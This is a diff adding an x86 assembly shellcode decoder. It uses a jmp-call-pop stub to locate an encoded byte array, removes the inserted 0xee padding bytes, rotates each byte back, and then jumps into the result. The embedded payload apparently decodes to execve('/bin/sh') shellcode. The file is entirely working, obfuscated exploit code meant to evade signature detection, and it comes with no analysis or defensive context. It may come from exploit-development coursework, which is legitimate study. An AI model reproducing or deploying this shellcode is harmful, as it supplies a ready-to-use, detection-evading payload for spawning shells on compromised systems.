@@ -1,0 +1,41 @@
+
+/* rolb 1 decoder, insertion 0xee 
+   99 bytes
+*/
+
+.global _start
+
+.text
+_start: 
+
+        jmp call_trick          
+
+prepare_deco: 
+	xorl %ebx, %ebx 	/* ebx, eax, edx = 0 */
+	mul %ebx
+        popl %esi 	/* both esi, edx contains &shellcode */
+	movl %esi, %edx	
+        leal 1(%esi),%edi 
+        movb $1,%al
+
+remove_seq:
+        xorb $0xee,(%esi,%eax)
+        jnz remove_rot 
+        movb 1(%esi,%eax),%bl
+	movb %bl, (%edi)
+        incl %edi
+        addb $2,%al
+        jmp remove_seq
+
+remove_rot: 
+	rorb $1, (%edx)
+        leal 1(%edx),%edx         
+        movb (%edx),%bl
+        cmpb $0xff,%bl /* encoded shellcode ends with 0xff */            
+        je shellcode
+        jmp remove_rot                
+
+call_trick: 
+        call prepare_deco
+        shellcode: .byte 0x62,0xee,0x81,0xee,0xa0,0xee,0xd0,0xee,0x5e,0xee,0x5e,0xee,0xe6,0xee,0xd0,0xee,0xd0,0xee,0x5e,0xee,0xc4,0xee,0xd2,0xee,0xdc,0xee,0x13,0xee,0xc7,0xee,0xa0,0xee,0x13,0xee,0xc3,0xee,0x13,0xee,0xc5,0xee,0x61,0xee,0x16,0xee,0x9b,0xee,0x01,0xee,0xff
+
